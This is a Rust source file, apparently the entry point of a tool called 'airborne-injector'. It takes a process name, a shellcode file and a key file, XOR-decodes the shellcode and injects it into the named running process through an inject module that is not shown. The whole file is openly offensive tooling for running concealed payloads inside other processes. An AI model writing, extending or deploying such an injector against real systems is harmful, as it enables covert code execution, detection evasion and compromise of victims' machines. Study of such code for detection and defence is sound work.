mod inject;
mod process;

use std::{fs, path::PathBuf, process::exit};

use lexopt::Arg::{Long, Short};

#[derive(Debug)]
struct Args {
    procname: String,
    shellcode_path: PathBuf,
    keyfile_path: PathBuf,
    offset: usize,
}

fn main() {
    let args = parse_args();
    let proc_id =
        unsafe { process::iterate_procs(&args.procname).expect("failed to find matching PID") };

    let mut shellcode = fs::read(&args.shellcode_path).expect("failed to read shellcode");

    if args.offset >= shellcode.len() {
        println!("[!] offset is greater or equal than shellcode length");
        exit(1);
    }

    let keyfile = fs::read(&args.keyfile_path).expect("failed to read keyfile");
    println!("[+] xor'ing shellcode");
    airborne_utils::xor_cipher(&mut shellcode, &keyfile);

    println!("[+] injecting shellcode into {}", args.procname);
    unsafe { inject::inject(proc_id, shellcode) };

    println!("[+] done");
}

fn parse_args() -> Args {
    let mut args = Args {
        procname: String::new(),
        shellcode_path: PathBuf::new(),
        keyfile_path: PathBuf::new(),
        offset: 0,
    };

    let mut parser = lexopt::Parser::from_env();

    while let Some(arg) = parser.next().expect("failed to parse arguments") {
        match arg {
            Short('p') => {
                args.procname = parser
                    .value()
                    .expect("failed to parse process name")
                    .into_string()
                    .expect("failed to convert process name into String");
            }
            Short('s') => {
                args.shellcode_path = parser
                    .value()
                    .expect("failed to parse shellcode path")
                    .into();
            }
            Short('k') => {
                args.keyfile_path = parser.value().expect("failed to parse keyfile path").into();
            }
            Short('h') | Long("help") => {
                print_usage();
                exit(0);
            }
            _ => {
                println!("[!] invalid argument: {:?}", arg);
                print_usage();
                exit(1);
            }
        }
    }

    if args.procname.is_empty() || !args.shellcode_path.exists() || !args.keyfile_path.exists() {
        println!("[!] missing or invalid argument(s)");
        print_usage();
        exit(1);
    }

    args
}

fn print_usage() {
    println!(
        "Usage: airborne-injector.exe -p <process_name> -s <shellcode_path> -k <keyfile_path>"
    );
}
